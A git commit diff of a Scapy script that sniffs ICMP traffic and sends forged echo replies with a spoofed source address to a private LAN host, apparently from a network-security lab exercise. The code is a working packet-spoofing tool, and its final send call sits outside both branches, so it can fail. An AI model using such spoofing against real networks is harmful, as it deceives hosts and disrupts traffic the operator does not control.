c8f83fd1b912e9bbc5a889ff72a94f0254494197
cappetta <thomas.cappetta@gmail.com>
2020-10-21 20:07:03 -0400

    AWS-25: updating for 2.3

--- Sniffing_Spoofing/Scapy/sniff_spoof_icmp.py
+++ Sniffing_Spoofing/Scapy/sniff_spoof_icmp.py
@@ -3,21 +3,38 @@ from scapy.all import *
 
 def spoof_pkt(pkt):
   if ICMP in pkt and pkt[ICMP].type == 8:
-     print("Original Packet.........")
+     print("Original Echo Request Packet.........")
      print("Source IP : ", pkt[IP].src)
      print("Destination IP :", pkt[IP].dst)
 
-#     ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
-     ip = IP(src='1.1.1.1', dst=pkt[IP].src, ihl=pkt[IP].ihl)
+     ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
      icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
      data = pkt[Raw].load
      newpkt = ip/icmp/data
 
-     print("Spoofed Packet.........")
+     print("Spoofed Echo Request Packet.........")
      print("Source IP : ", newpkt[IP].src)
      print("Destination IP :", newpkt[IP].dst)
 
-     send(newpkt,verbose=0)
+    #  send(newpkt,verbose=0)
+     
+  if ICMP in pkt and pkt[ICMP].type == 0:
+     print("Original Echo Reply Packet.........")
+     print("Source IP : ", pkt[IP].src)
+     print("Destination IP :", pkt[IP].dst)
 
-#pkt = sniff(filter='icmp and src host 10.0.2.69',prn=spoof_pkt)
-pkt = sniff(filter='icmp',prn=spoof_pkt)
+    #  ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
+     src = '1.1.1.1'
+     dst = '192.168.1.42'
+     ip = IP(src=src, dst=dst, ihl=pkt[IP].ihl)
+     icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
+     data = pkt[Raw].load
+     newpkt = ip/icmp/data
+
+     print("Spoofed Echo Reply Packet.........")
+     print("Source IP : ", newpkt[IP].src)
+     print("Destination IP :", newpkt[IP].dst)
+
+  send(newpkt,verbose=0)
+
+pkt = sniff(filter='icmp[icmptype]=0 and host 192.168.1.43',prn=spoof_pkt)
